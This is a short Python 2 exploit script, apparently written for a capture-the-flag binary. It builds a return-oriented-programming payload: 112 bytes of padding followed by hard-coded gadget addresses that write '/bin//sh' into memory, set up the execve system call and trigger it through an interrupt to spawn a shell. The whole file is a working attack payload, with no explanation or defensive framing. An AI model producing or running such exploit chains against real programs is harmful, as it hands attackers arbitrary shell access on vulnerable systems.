from struct import pack

padding = "a" * 112

pop_edx = pack("<I", 0x0805733a)

# 58 0c   pop eax; ret
pop_eax = pack("<I", 0x080c2356)

reset_eax = pack("<I", 0x080b86ff)

write_eax_to_edx_mem = pack("<I", 0x0808e97d)

pop_ecx_and_ebx = pack("<I", 0x08057361)

inc_eax = pack("<I", 0x0807026c) + "a" * 16

data0 = pack("<I", 0x080ef060)
data1 = pack("<I", 0x080ef064)
data2 = pack("<I", 0x080ef068)

write_data0 = pop_edx + data0 + pop_eax + "/bin" + write_eax_to_edx_mem

write_data1 = pop_edx + data1 + pop_eax + "//sh" + write_eax_to_edx_mem

write_zero = pop_edx + data2 + reset_eax + write_eax_to_edx_mem

set_arguments = inc_eax * 11 + pop_ecx_and_ebx + data2 + data0 + pop_edx + data2

interrupt = pack("<I", 0x08057ae0)

print padding + write_data0 + write_data1 + write_zero + set_arguments + interrupt
